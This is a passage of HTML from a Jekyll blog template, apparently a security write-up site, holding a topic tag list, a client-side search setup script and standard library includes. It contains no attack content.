href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
